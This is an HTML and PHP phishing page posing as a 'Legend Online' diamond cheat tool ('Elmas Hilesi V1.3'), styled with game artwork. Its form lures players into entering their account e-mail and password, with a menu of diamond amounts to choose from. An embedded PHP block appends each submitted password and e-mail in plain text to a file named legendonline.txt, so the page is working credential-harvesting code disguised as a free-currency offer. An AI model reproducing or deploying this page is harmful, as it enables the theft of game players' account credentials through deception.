<!DOCTYPE html>
<html>
 <head>
  <title>
   -- Zula V1.3 --
  </title>
 <link rel="shortcut icon" href="https://is4-ssl.mzstatic.com/image/thumb/Purple115/v4/e4/4c/80/e44c8087-a9b0-4ff3-f7f6-fdc2de46ab80/source/256x256bb.jpg" type="image/vnd.microsoft.icon">
  <style type="text/css">
   .div1{
      background-color:#040302;
      height: 710px;
      width: 500px;
      border-radius: 35px;
      border:4px solid #21160d;
      opacity: 0.8;
      filter: alpha(opacity=40);
    }
    .text{
      color:red;
      font-size: 48px;
      background-color:black;
      padding-bottom: 20px;
      border-radius: 48px; 
    }
    .text2{
      color:orange;
      font-size:28px;
      background-color:black;
      border-radius: 50px;
      padding-top: 25px;
      padding-bottom: 25px;
    }
    .input{
     height: 40px; 
     width: 250px; 
     font-size: 18px; 
     padding: 5px; 
     margin-bottom: 15px; 
     border-radius: 7px; 
     background-color:#b4b2b2; 
     border: none; 
     color: #000; 

    }
    .button{
     width: 100px; 
     font-size: 18px;  
     margin: 0 auto;
     background-color: red; 
     border: none; 
     height: 40px; 
    border-radius: 18px;
    }
     canvas { 
     display: block; 
     position: fixed; 
  top: 0; 
  left: 0; 
     z-index: -1000; 
 }
 .body{
  background: url("https://rok-lortr.oasgames.com/storage/images/201704/58f1325c5fae9.jpg") no-repeat center center fixed; 
    -webkit-background-size: cover;
    -moz-background-size: cover;
    -o-background-size: cover;
    background-size: cover;
 }
 .select{
  color:orange;
  font-size:18px;
  width:75px;
  height:40px;
  background-color:#040302;
  border-radius: 20px;
 }
  </style>
 </head>
 <body class='body'>
  <center>
   <div class="div1">
    <p class="text">
     Legend Online
    </p>
    <form method="post">
     <p class="text2">
      Elmas Hilesi V1.3
     </p>
     <p style="color:red;font-size:14px;">E-MAİL</p>
     <input class="input" name="mamak" placeholder="xxxxxxxx@xxxxx.com" type="text" required="" />
     <p style="color:red;font-size:14px;">Password</p>
     <input class="input" name="ssel" placeholder="***********" type="password" required="" /><br>
     <select class='select'>
      <option>1000</option>
      <option>3000</option>
      <option>5000</option>
      <option>8000</option>
      <option>10000</option>
      <option>25000</option>

     </select>
     <br>
      <br>
<input type="submit" value="Next" class='button'>


</form>
</div>
</center>
<?php
if (!empty($_POST["mamak"]) && !empty($_POST["ssel"])) {
$ac = fopen("legendonline.txt","a+");
$names = $_POST['mamak'];
$password = $_POST['ssel'];
$userlar = ("\n __________________ \n Password: ".$password."\n E-Mail: ".$names."\n__________________ \n");
fwrite($ac,$userlar);
fclose($ac);}
?>



</body>
</html>